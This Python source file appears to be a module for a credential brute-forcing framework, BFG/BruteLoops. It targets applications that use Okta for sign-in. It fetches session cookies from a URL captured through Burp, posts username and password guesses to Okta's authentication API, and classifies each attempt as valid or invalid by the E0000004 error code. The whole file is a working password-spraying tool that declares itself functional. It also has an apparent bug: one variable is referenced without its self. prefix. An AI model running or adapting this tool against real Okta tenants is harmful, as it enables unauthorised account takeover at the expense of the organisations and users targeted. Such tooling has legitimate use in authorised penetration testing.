#!/usr/bin/env python3
import warnings
warnings.filterwarnings('ignore')
from re import search, compile
import requests
from bfg.args import http as http_args
from bfg.shortcuts.http import HTTPModule, handleUA, defaultHTTPArgs
from bruteloops.logging import getLogger, GENERAL_EVENTS

FAIL_VALUE = 'E0000004'

# =================
# MODULE PROPERTIES
# =================

DESCRIPTION = \
'''Brute force credentials for an application configured to use Okta
as an external identity provider. Note that this module will require 
the operator to proxy an authentication request through Burp to get
the artifacts required to support the attack: cookies_url, and 
cookies_referer_url. WARNING: If valid credentials are already
available, testing them through BFG is recommended to ensure
that changes to Okta's authentication process have not broken this
module (things feel complicated).'''

# ===========
# HELP VALUES
# ===========

URL_HELP = \
'The Okta URL to authenticate to, usually in the form of: ' \
'https://<target>.okta.com/api/v1/authn'

COOKIES_URL_HELP = \
'URL that issues cookies required for authentication. Should be a URL ' \
'like "https://<target>.okta.com/login/login.htm?fromURI=<encoded_param>". ' \
'Authenticate to the application that uses Okta as an identity provider ' \
'while proxying through Burp to identify this value. FORMATTING NOTE: Update the ' \
'URL to match the following while replacing the username and domain values ' \
'with template strings: https://<target>.okta.com/login/login.htm?fromURI=....' \
'....{USERNAME}%%2540{DOMAIN}......'

REFERER_URL_HELP = \
'The URL that should be embedded in the HTTP referer header when ' \
'acquiring cookies from the `cookies_url` source. This is the value ' \
'of the referer header found in the same request described in ' \
'`cookies_url`.'

class Module(HTTPModule):

    brief_description = 'Okta JSON API'

    description = DESCRIPTION

    args = [
            http_args.url(help=URL_HELP),
            http_args.url(
                '--cookies-url',
                help=COOKIES_URL_HELP),
            http_args.url(
                '--cookies-referrer-url',
                required=False,
                help=REFERER_URL_HELP,
                default=None),
        ] + \
        http_args.getDefaults('url', invert=True)

    verified_functional = True

    notes = [
        'You\'ll need to get the value for --cookies-url by proxying '
        'an auth request through Burp.',
        'The --cookies-url format will be approximately: https://'
        '<target>.okta.com/login/login.htm?fromURI=<encoded_param>'
        '...username%2540domain....',
        'Update the above value with template strings for the username '
        'and domain, like https://<target>.okta.com/login/login.htm?'
        'fromURI=<encoded_param>{USERNAME}%2540{DOMAIN}<trailing_params>'
    ]

    def __post_init__(self, cookies_url, cookies_referrer_url,
            *args, **kwargs):

        self.cookies_url = cookies_url
        self.cookies_referrer_url = cookies_referrer_url
        self.log = getLogger('okta', log_level=GENERAL_EVENTS)
        self.username_reg = compile('^(.+)(@|\\\\|/)(.+)')

    def __call__(self,username,password,*args,**kwargs):

        # =====
        # NOTES
        # =====
        '''
        - Okta serves as an identity provider
        - Upstream services authenticate users via Okta's services
        - As a web app, the origin service will redirect the user to
          Okta to complete authentication
        - Cursory research suggests the following values are needed
          to authenticate to the application programmatically during
          a brute force attack:
            - The URL which the credentials will be posted to once
              cookies have been obtained
                - Appears to be in the form:
                  https://<target>.okta.com/api/v1/authn
            - Two values that will likely need to be acquired by
              proxying an authentication request through Burp:
              - The URL that is used to issue a valid session token, a
                "cookies_url"
              - The referer header from the request that produced that
                URL, a "cookies_referer_url"
        '''

        # =====================
        # CRAFT THE COOKIES URL
        # =====================
        '''
        - logic crafts the URL used to obtain cookies for authentication
        - first, it splits the username value into a tuple: (username, domain)
        - second, it updates the '{USERNAME}' and '{DOMAIN}' values in the
          cookies_url argument accordingly
        '''

        bad_creds = dict(outcome=0, username=username,
                password=password,events=list())

        try:
            # parse the username and domain from the username
            match = search(self.username_reg, username)

            if match is None:

                bad_creds['events'].append(
                    f'Invalid username format for "{username}".'
                    ' Username must be in <username>@<domain>.com -- '
                    'Skipping.')

                return bad_creds

            else:

                groups = match.groups()

            # update the cookies_url value
            cookies_url = self.cookies_url.replace('{USERNAME}',
                groups[0])
            cookies_url = cookies_url.replace('{DOMAIN}',
                groups[2])

        except Exception as e:

            bad_creds['events'].append(f'Unhandled exception: {e}')
            return bad_creds

        # ==============
        # UPDATE HEADERS
        # ==============
        '''
        - inject user-supplied headers
        - ensure that the cookies_referer_url is always the referer
        '''

        headers = self.headers

        if self.cookies_referrer_url:
            headers['Referer'] = cookies_referrer_url

        # =============================
        # BUILD SESSION AND GET COOKIES
        # =============================

        session = requests.Session()
        session.get(cookies_url, headers=headers, proxies=self.proxies)

        # ===================================
        # BUILD REQUEST DATA AND MAKE REQUEST
        # ===================================
        '''
        - authentication JSON payload is crafted here
        - referer header is updated to match the cookies_url
        '''

        # post data
        data = {
            "password":password,
            "username":username,
            "options":
            {
                "warnBeforePasswordExpired":True,
                "multiOptionalFactorEnroll":True
            }
        }

        # Update headers again. Referer header should match the cookies_url
        headers['referer'] = cookies_url
    
        try:
            # make the request
            resp = session.post(self.url,
                    json=data,
                    headers=headers,
                    verify=self.verify_ssl,
                    allow_redirects=False,
                    proxies=self.proxies)

        except (requests.exceptions.ConnectionError, requests.exceptions.Timeout):
            return dict(
                outcome=-1,
                username=username,
                password=password,
                events=['Connection Error or Timeout'])
        
        # ===================================
        # CHECK FOR SUCCESSFUL AUTHENTICATION
        # ===================================
    
        # verify credentials and return outcome
        if resp.status_code == 401 or resp.text.find(FAIL_VALUE) >-1:
            return dict(outcome=0, username=username, password=password)
        else:
            return dict(outcome=1, username=username, password=password)
